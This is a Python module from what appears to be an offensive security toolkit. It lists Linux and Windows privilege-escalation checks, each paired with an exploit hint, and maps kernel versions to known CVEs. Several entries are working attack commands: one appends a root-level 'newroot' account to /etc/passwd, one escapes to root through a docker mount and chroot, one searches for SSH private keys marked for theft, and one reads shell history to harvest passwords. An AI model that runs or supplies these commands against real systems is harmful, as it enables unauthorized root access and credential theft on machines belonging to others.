"""Privilege Escalation vectors & enumeration."""
from ..utils.helpers import status

LINUX_VECTORS = [
    {"name":"Sudo privileges","cmd":"sudo -l 2>/dev/null","exploit":"sudo /bin/bash"},
    {"name":"SUID binaries","cmd":"find / -perm -4000 -type f 2>/dev/null | head -20","exploit":"Check GTFOBins"},
    {"name":"Writable /etc/passwd","cmd":"[ -w /etc/passwd ] && echo 'WRITABLE'","exploit":"openssl passwd -1 -salt x password && echo 'newroot:PASSWD:0:0:root:/root:/bin/bash' >> /etc/passwd"},
    {"name":"Docker group","cmd":"groups 2>/dev/null | grep docker","exploit":"docker run -v /:/mnt --rm -it alpine chroot /mnt sh"},
    {"name":"Capabilities","cmd":"getcap -r / 2>/dev/null | grep -v cap_net | head -10","exploit":"See GTFOBins for capability exploits"},
    {"name":"Cron jobs","cmd":"ls -la /etc/cron* /var/spool/cron/ 2>/dev/null","exploit":"Modify writable cron scripts"},
    {"name":"Writable /etc/shadow","cmd":"[ -w /etc/shadow ] && echo 'CRITICAL'","exploit":"Direct password modification"},
    {"name":"NFS no_root_squash","cmd":"cat /etc/exports 2>/dev/null | grep no_root_squash","exploit":"Mount NFS share and create SUID binary"},
    {"name":"Kernel version","cmd":"uname -r 2>/dev/null","exploit":"Check kernel exploit DB"},
    {"name":"World-writable files","cmd":"find / -perm -2 -type f -not -path '/proc/*' 2>/dev/null | head -20","exploit":"Modify writable system files"},
    {"name":".bash_history","cmd":"cat ~/.bash_history 2>/dev/null | tail -50","exploit":"Find passwords in history"},
    {"name":"SSH keys","cmd":"find / -name 'id_rsa' -o -name '*.pem' 2>/dev/null | head -10","exploit":"Steal private keys"},
]

WINDOWS_VECTORS = [
    {"name":"AlwaysInstallElevated","cmd":'reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul',"exploit":"Generate MSI with msfvenom"},
    {"name":"Unquoted service paths","cmd":'wmic service get name,pathname 2>nul | findstr /i /v "C:\\Windows" | findstr /i /v """',"exploit":"Place malicious EXE in unquoted path"},
    {"name":"Service permissions","cmd":'icacls "C:\\Program Files\\*" 2>nul | findstr /i "Everyone"',"exploit":"Modify service binary"},
    {"name":"UAC level","cmd":'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA 2>nul',"exploit":"BypassUAC techniques"},
    {"name":"Token impersonation","cmd":"whoami /priv 2>nul | findstr SeImpersonate","exploit":"JuicyPotato / PrintSpoofer"},
]

KERNEL_EXPLOITS = {
    "2.6": ["CVE-2009-2692","DirtyCow CVE-2016-5195"],
    "3.13": ["CVE-2015-1328 overlayfs"],
    "4.4": ["CVE-2016-5195 DirtyCow","CVE-2017-7308 AF_PACKET"],
    "4.10": ["CVE-2017-16995 eBPF"],
    "5.8": ["CVE-2022-0847 DirtyPipe"],
    "5.11": ["CVE-2022-0847 DirtyPipe"],
}

class PrivEscChecker:
    """Privilege escalation enumeration."""

    @staticmethod
    def get_checks(os_type: str = "linux") -> list:
        return LINUX_VECTORS if os_type == "linux" else WINDOWS_VECTORS

    @staticmethod
    def get_kernel_exploits(version: str) -> list:
        exploits = []
        for ver, exps in KERNEL_EXPLOITS.items():
            if version.startswith(ver):
                exploits.extend(exps)
        return exploits

    @staticmethod
    def display_vectors(os_type: str = "linux", kernel: str = None):
        status(f"PrivEsc vectors for {os_type.upper()}:", "info")
        vectors = PrivEscChecker.get_checks(os_type)
        for v in vectors:
            status(f"  {v['name']}")
            status(f"    Check:  {v['cmd']}", "info")
            if v.get("exploit"):
                status(f"    Exploit: {v['exploit']}", "warning")

        if kernel:
            exploits = PrivEscChecker.get_kernel_exploits(kernel)
            if exploits:
                status(f"Kernel exploits for {kernel}:", "info")
                for e in exploits:
                    status(f"  {e}", "warning")
